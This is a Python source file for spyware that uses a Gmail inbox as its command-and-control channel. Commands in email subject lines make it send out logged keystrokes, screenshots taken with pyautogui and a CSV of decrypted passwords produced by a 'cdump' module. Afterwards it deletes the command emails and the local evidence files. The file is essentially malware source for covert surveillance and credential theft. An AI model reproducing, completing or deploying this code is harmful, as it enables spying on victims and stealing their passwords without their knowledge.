import smtplib
import os
import email
from email.message import EmailMessage
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText

import datetime
import pyautogui
import imaplib

import cdump


class EmailManager:

    def __init__(self, email, password, id, rate=5):
        self.email = email
        self.password = password
        self.id = id
        self.rate = rate
        self.keys = []

    def scheduled_check(self):
        print("scheduled check")

        imap_server = imaplib.IMAP4_SSL("imap.gmail.com", 993)
        imap_server.login(self.email, self.password)
        imap_server.select("inbox")
        _, msg_nums = imap_server.search(None, "ALL")

        # making every msg in inbox readable
        for msg_num in msg_nums[0].split():
            _, data = imap_server.fetch(msg_num, "(RFC822)")

            message = email.message_from_bytes(data[0][1])

            if message.get('Subject') == "give" + " " + self.id:
                self.give_command_received(imap_server, msg_num)
            elif message.get('Subject') == "screenshot" + " " + self.id:
                self.screenshot_command_received(imap_server, msg_num)
            elif message.get('Subject') == "dump" + " " + self.id:
                print("dump command")
                self.new_email(self.email, self.id + "'s cached info", "dump", "\n[*] Date: " + str(datetime.datetime.now()))
                print("email sent")
                imap_server.store(msg_num, "+FLAGS", "\\Deleted")
                print("email prompt removed")
                os.remove("decrypted_password.csv")

        imap_server.expunge()
        imap_server.close()

    # keys and screenshots from when certain important keys are pressed, like @
    def give_command_received(self, imap_server, msg_num):
        print("give command")
        self.new_email(self.email, self.id + "'s keys", "give", "[*] Inputs: " + str(self.keys) + "\n[*] Date: " + str(datetime.datetime.now()))
        print("email sent")
        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
        print("email prompt removed")
        for i in range(len(os.listdir("logs"))):
            os.remove(f"logs/det{i + 1}.jpg")

    def screenshot_command_received(self, imap_server, msg_num):
        print("screenshot command")
        self.new_email(self.email, self.id + "'s picture", "screenshot", "[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
        print("email sent")
        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
        print("email prompt removed")
        for i in range(len(os.listdir("ss"))):
            os.remove(f"ss/sc.jpg")

    def dump_command_received(self, imap_server, msg_num):
        print("dump command")
        self.new_email(self.email, self.id + "'s cached info", "dump", "\n[*] Date: " + str(datetime.datetime.now()))
        print("email sent")
        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
        print("email prompt removed")
        os.remove("decrypted_password.csv")

    def new_email(self, to, subject, command, body=None):
        msg = EmailMessage()
        msg['to'] = to
        msg['subject'] = subject
        try:
            msg.set_content(body)
        except:
            ...

        msg['from'] = self.email

        if command == "give":
            try:
                msg.make_mixed()  # This converts the message to multipart/mixed
                for i in range(len(os.listdir("logs"))):
                    image = open(f"logs/det{str(i + 1)}.jpg", 'rb')
                    att = MIMEImage(image.read())
                    att.add_header('Content-Disposition', 'attachment', filename=str(image))
                    msg.attach(att)  # Don't forget to convert the message to multipart first!
            except:
                ...
        elif command == "screenshot":

            shot = pyautogui.screenshot()
            print("saved")
            shot.save(f"ss/sc.jpg")

            msg.make_mixed()  # This converts the message to multipart/mixed
            image = open(f"ss/sc.jpg", 'rb')
            att = MIMEImage(image.read())
            att.add_header('Content-Disposition', 'attachment', filename=str(image))
            msg.attach(att)  # Don't forget to convert the message to multipart first![

        elif command == "dump":
            msg.make_mixed()  # This converts the message to multipart/mixed
            cdump.run()
            # open and read the CSV file in binary
            with open(f"decrypted_password.csv", 'rb') as file:
                # Attach the file with filename to the email
                msg.attach(MIMEApplication(file.read(), Name="decrypted"))


        smtp_server = smtplib.SMTP("smtp.gmail.com", 587)

        smtp_server.starttls()
        smtp_server.login(self.email, self.password)
        smtp_server.send_message(msg)
        smtp_server.quit

    def receive_email(self, fromWho):
        imap_server = imaplib.IMAP4_SSL("imap.gmail.com", 993)
        imap_server.login(self.email, self.password)
        imap_server.select("inbox")
        _, msg_nums = imap_server.search(None, "ALL")

        # making every msg in inbox readable
        for msg_num in msg_nums[0].split():
            _, data = imap_server.fetch(msg_num, "(RFC822)")
            message = email.message_from_bytes(data[0][1])
            if message.get('From').split('<')[1].split('>')[0] == fromWho:
                print("Message #: ", msg_num)
                print("From: ", message.get('From'))
                print("Date: ", message.get('Date'))
                print("Subject: ", message.get('Subject'))
                print("Body: ", end="")
                for part in message.walk():
                    if part.get_content_type() == "text/plain":
                        print(part.as_string())
        imap_server.close()


if __name__ == '__main__':
    # NewEmail("@vtext.com", "Test!", "This was a test.")    .split('<')[1].split('>')[0]
    manager = EmailManager("email", "password")
    manager.receive_email()